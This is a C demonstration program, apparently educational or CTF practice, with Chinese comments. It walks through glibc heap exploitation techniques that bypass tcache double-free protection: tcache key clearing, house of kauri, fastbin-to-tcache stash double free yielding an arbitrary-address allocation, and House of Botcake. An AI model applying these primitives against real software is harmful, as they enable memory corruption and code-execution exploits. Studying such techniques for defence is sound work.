#include <stddef.h>
#include <stdlib.h>
#include <stdio.h>
size_t getheap()
{
    puts("getheap");
    size_t libc_addr=puts-0x70970;
    size_t* mp_72=libc_addr+0x3b62c8;
    size_t heap=*mp_72;
    return heap;
}
int main()
{    
    printf("--------------------------------------------\n");
    //清除 tcache key：通过一些 UAF 手段将该 free chunk 中记录的 tcache key清除，从而绕过该检测。
    size_t* chunk1=malloc(0x10);
    free(chunk1);
    size_t* key=chunk1[1];
    printf("chunk key %p\n",key);
    chunk1[1]=0; 
    free(chunk1);
    printf("chunk1 fd %p\n",chunk1[0]);
    printf("chunk1  %p\n",chunk1);
    printf("--------------------------------------------\n");
    //house of kauri：通过修改 size 使两次 free 的同一块内存进入不同的 entries 。
    size_t* chunk2=malloc(0x20);
    free(chunk2);
    chunk2[-1]=0x40; 
    free(chunk2);
    size_t* heapbase=getheap();
    printf("tcache bin 0x30 entry %p\n",heapbase[0x13]);
    printf("tcache bin 0x40 entry %p\n",heapbase[0x14]);
    printf("--------------------------------------------\n");
    // tcache stash with fastbin double free：
    // 在 fastbin 中并没有严密的 double free 检测，我们可以在填满对应的 tcache 链条后在 fastbin 中完成 double free，
    // 随后通过 stash 机制将 fastbin 中 chunk 倒回 tcache 中。此时 fsat bin double free 就变成了 tcahce double free 。
    size_t* chunkarray[0x10];
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x60);
    }
    size_t* chunk3=malloc(0x60);
    size_t* chunk4=malloc(0x60);
     for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }

    free(chunk3);
    free(chunk4);
    free(chunk3);
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x60);
    }
    chunk3=malloc(0x60);
    size_t fake_chunk[4];
    chunk3[0]=&fake_chunk[2]; //any just can be access
    malloc(0x60);
    malloc(0x60);
    size_t* dest_chunk=malloc(0x60);
    printf("(dest_chunk==&fake_chunk[2])= %d\n",dest_chunk==&fake_chunk[2]);
    printf("--------------------------------------------\n");
    //      House of Botcake
    // 同一个 chunk 释放到 tcache 和 unsorted bin 中。释放在 unsorted bin 的 chunk 借助堆块合并改变大小。
    // 相对于上一个方法，这个方法的好处是一次 double free 可以多次使用，因为控制同一块内存的 chunk 大小不同。
    for(int i=0;i<7;i++)
    {
        chunkarray[i]=malloc(0x80);
    }    
    size_t* chunk5=malloc(0x80);
    size_t* chunk6=malloc(0x80);
    size_t* chunk7=malloc(0x80);
     for(int i=0;i<7;i++)
    {
        free(chunkarray[i]);
    }    
    free(chunk5); 
    free(chunk6);
    malloc(0x80);
    free(chunk6); //chunk6同时存在与unsortedbin和tcachebin
    size_t* chunk8 =malloc(0x110);
    printf("chunk 8 +0x80+0x10 %p\n",&chunk8[18]);
    printf("chunk 6 %p\n",chunk6);
    printf("--------------------------------------------\n");
}